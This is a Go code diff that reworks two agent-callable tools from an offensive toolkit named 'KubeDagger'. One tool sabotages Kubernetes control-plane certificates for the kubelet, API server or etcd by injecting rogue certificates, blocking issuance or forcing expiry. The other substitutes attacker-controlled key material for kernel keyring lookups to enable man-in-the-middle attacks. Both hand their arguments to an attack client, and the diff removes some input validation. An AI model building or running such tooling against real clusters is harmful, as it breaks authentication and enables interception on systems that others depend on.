@@ -13,10 +13,8 @@ import (
 // Cert Sabotage
 
 type CertSabotageInput struct {
-	Action    string `json:"action"`
-	Target    string `json:"target,omitempty"`
-	Namespace string `json:"namespace,omitempty"`
-	Secret    string `json:"secret,omitempty"`
+	Mode       string `json:"mode,omitempty"`
+	CertTarget string `json:"cert_target,omitempty"`
 }
 
 type CertSabotageTool struct {
@@ -30,32 +28,24 @@ func NewCertSabotage(exec executor.Executor) *CertSabotageTool {
 func (t *CertSabotageTool) Name() string { return "kubedagger_cert_sabotage" }
 
 func (t *CertSabotageTool) Description() string {
-	return "Sabotage TLS certificates in the cluster by intercepting cert-manager operations, replacing CA bundles, or injecting rogue certificates into secrets. Can cause mTLS authentication failures or enable MITM."
+	return "Sabotage TLS certificate handling for Kubernetes control plane components. Can inject rogue certificates, block certificate issuance/renewal, or force certificate expiry to cause mTLS authentication failures or enable MITM."
 }
 
 func (t *CertSabotageTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"mode": {
 				"type": "string",
-				"enum": ["replace-ca", "inject-cert", "expire", "mitm", "status"],
-				"description": "Certificate sabotage action"
+				"enum": ["inject", "block", "expire"],
+				"description": "Certificate sabotage mode (default: expire)"
 			},
-			"target": {
+			"cert_target": {
 				"type": "string",
-				"description": "Target service or ingress"
-			},
-			"namespace": {
-				"type": "string",
-				"description": "Target namespace"
-			},
-			"secret": {
-				"type": "string",
-				"description": "TLS secret name to target"
+				"enum": ["kubelet", "apiserver", "etcd"],
+				"description": "Control plane component whose certificates are targeted (default: kubelet)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -65,25 +55,12 @@ func (t *CertSabotageTool) Execute(ctx context.Context, params json.RawMessage) 
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Target, "target"); err != nil {
-		return errorResult(err.Error()), nil
+	args := []string{"cert-sabotage"}
+	if input.Mode != "" {
+		args = append(args, "--mode", input.Mode)
 	}
-	if err := validateNamespace(input.Namespace); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Secret, "secret"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-
-	args := []string{"cert-sabotage", "--action", input.Action}
-	if input.Target != "" {
-		args = append(args, "--target", input.Target)
-	}
-	if input.Namespace != "" {
-		args = append(args, "--namespace", input.Namespace)
-	}
-	if input.Secret != "" {
-		args = append(args, "--secret", input.Secret)
+	if input.CertTarget != "" {
+		args = append(args, "--cert-target", input.CertTarget)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -97,7 +74,7 @@ func (t *CertSabotageTool) Execute(ctx context.Context, params json.RawMessage) 
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Cert Sabotage: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Cert Sabotage\n\n")
 	if output == "" {
 		sb.WriteString("Sabotage active.\n")
 	} else {
@@ -114,9 +91,8 @@ func (t *CertSabotageTool) Execute(ctx context.Context, params json.RawMessage) 
 // Keyring MITM
 
 type KeyringMITMInput struct {
-	Action string `json:"action"`
-	Target string `json:"target,omitempty"`
-	Port   int    `json:"port,omitempty"`
+	TargetKeyType string `json:"target_key_type,omitempty"`
+	ReplaceWith   string `json:"replace_with,omitempty"`
 }
 
 type KeyringMITMTool struct {
@@ -130,28 +106,23 @@ func NewKeyringMITM(exec executor.Executor) *KeyringMITMTool {
 func (t *KeyringMITMTool) Name() string { return "kubedagger_keyring_mitm" }
 
 func (t *KeyringMITMTool) Description() string {
-	return "Perform MITM attacks by intercepting TLS handshakes and substituting certificates from the kernel keyring. Hooks connect/accept syscalls to inject rogue certs transparently to both client and server."
+	return "Perform MITM attacks on kernel keyring operations by intercepting key lookups and substituting attacker-controlled keys. When a target process requests a key of the given type, the replacement key material is served instead."
 }
 
 func (t *KeyringMITMTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"target_key_type": {
 				"type": "string",
-				"enum": ["start", "stop", "status"],
-				"description": "MITM action"
+				"enum": ["user", "logon", "all"],
+				"description": "Key type to intercept (default: user)"
 			},
-			"target": {
+			"replace_with": {
 				"type": "string",
-				"description": "Target service to MITM"
-			},
-			"port": {
-				"type": "integer",
-				"description": "Target port"
+				"description": "Path to file containing replacement key material"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -161,16 +132,16 @@ func (t *KeyringMITMTool) Execute(ctx context.Context, params json.RawMessage) (
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Target, "target"); err != nil {
+	if err := validateSafeString(input.ReplaceWith, "replace_with"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"keyring-mitm", "--action", input.Action}
-	if input.Target != "" {
-		args = append(args, "--target", input.Target)
+	args := []string{"keyring-mitm"}
+	if input.TargetKeyType != "" {
+		args = append(args, "--target-key-type", input.TargetKeyType)
 	}
-	if input.Port > 0 {
-		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
+	if input.ReplaceWith != "" {
+		args = append(args, "--replace-with", input.ReplaceWith)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -184,7 +155,7 @@ func (t *KeyringMITMTool) Execute(ctx context.Context, params json.RawMessage) (
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Keyring MITM: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Keyring MITM\n\n")
 	if output == "" {
 		sb.WriteString("MITM active.\n")
 	} else {
